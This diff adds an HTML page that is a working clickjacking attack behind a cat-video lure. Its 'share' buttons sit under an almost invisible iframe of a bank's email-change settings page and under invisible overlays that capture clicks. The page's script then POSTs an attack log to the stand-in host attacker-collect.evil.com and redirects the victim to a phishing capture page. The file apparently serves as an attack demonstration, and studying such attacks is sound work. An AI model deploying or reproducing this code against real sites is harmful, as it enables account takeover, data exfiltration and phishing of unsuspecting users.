@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hilarious Cat Compilation - Must Watch!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 20px;
+        }
+        .content-wrapper {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .video-placeholder {
+            width: 100%;
+            height: 300px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .share-section {
+            text-align: center;
+            position: relative;
+        }
+        .share-section h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .share-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            position: relative;
+            z-index: 1;
+        }
+        .share-btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .share-btn:hover {
+            transform: scale(1.05);
+        }
+        .facebook-btn {
+            background-color: #1877f2;
+            color: white;
+        }
+        .twitter-btn {
+            background-color: #1da1f2;
+            color: white;
+        }
+        .linkedin-btn {
+            background-color: #0a66c2;
+            color: white;
+        }
+        .malicious-iframe {
+            position: absolute;
+            width: 600px;
+            height: 400px;
+            top: -80px;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0.002;
+            z-index: 9999;
+            pointer-events: auto;
+            border: none;
+        }
+        .invisible-overlay {
+            position: absolute;
+            width: 120px;
+            height: 48px;
+            z-index: 10000;
+            pointer-events: auto;
+        }
+        #fb-overlay {
+            top: 80px;
+            left: 50%;
+            transform: translateX(-165px);
+        }
+        #tw-overlay {
+            top: 80px;
+            left: 50%;
+            transform: translateX(-15px);
+        }
+        #li-overlay {
+            top: 80px;
+            left: 50%;
+            transform: translateX(135px);
+        }
+    </style>
+</head>
+<body>
+    <div class="content-wrapper">
+        <div class="video-placeholder">
+            🎬 Amazing Cat Video - Click to Watch! 🐱
+        </div>
+        <div class="share-section">
+            <h2>Share this hilarious video with your friends!</h2>
+            <div class="share-buttons">
+                <button class="share-btn facebook-btn" onclick="handleShare('facebook')">Share to Facebook</button>
+                <button class="share-btn twitter-btn" onclick="handleShare('twitter')">Share to Twitter</button>
+                <button class="share-btn linkedin-btn" onclick="handleShare('linkedin')">Share to LinkedIn</button>
+            </div>
+            <iframe id="attack-frame" class="malicious-iframe" src="https://secure-banking.example.com/settings/email-change"></iframe>
+            <div id="fb-overlay" class="invisible-overlay"></div>
+            <div id="tw-overlay" class="invisible-overlay"></div>
+            <div id="li-overlay" class="invisible-overlay"></div>
+        </div>
+    </div>
+
+    <script>
+        const attackLog = [];
+        
+        function handleShare(platform) {
+            const logEntry = {
+                action: 'share_clicked',
+                platform: platform,
+                timestamp: new Date().toISOString()
+            };
+            attackLog.push(logEntry);
+            console.log('User action logged:', logEntry);
+        }
+
+        document.getElementById('fb-overlay').addEventListener('click', function(e) {
+            attackLog.push({action: 'email_changed', target: 'facebook_overlay', timestamp: new Date().toISOString()});
+            executeAttackChain('facebook');
+        });
+
+        document.getElementById('tw-overlay').addEventListener('click', function(e) {
+            attackLog.push({action: 'settings_modified', target: 'twitter_overlay', timestamp: new Date().toISOString()});
+            executeAttackChain('twitter');
+        });
+
+        document.getElementById('li-overlay').addEventListener('click', function(e) {
+            attackLog.push({action: 'account_compromised', target: 'linkedin_overlay', timestamp: new Date().toISOString()});
+            executeAttackChain('linkedin');
+        });
+
+        function executeAttackChain(source) {
+            console.log('Attack chain initiated from:', source);
+            
+            setTimeout(function() {
+                window.location.href = '/phishing/capture.html?source=' + source + '&log=' + btoa(JSON.stringify(attackLog));
+            }, 500);
+            
+            fetch('https://attacker-collect.evil.com/log', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    attack_type: 'clickjacking',
+                    source: source,
+                    logs: attackLog,
+                    victim_action: 'email_change_confirmed'
+                })
+            }).catch(e => console.log('Logging failed'));
+        }
+
+        window.addEventListener('load', function() {
+            const iframe = document.getElementById('attack-frame');
+            iframe.style.pointerEvents = 'auto';
+        });
+    </script>
+</body>
+</html>
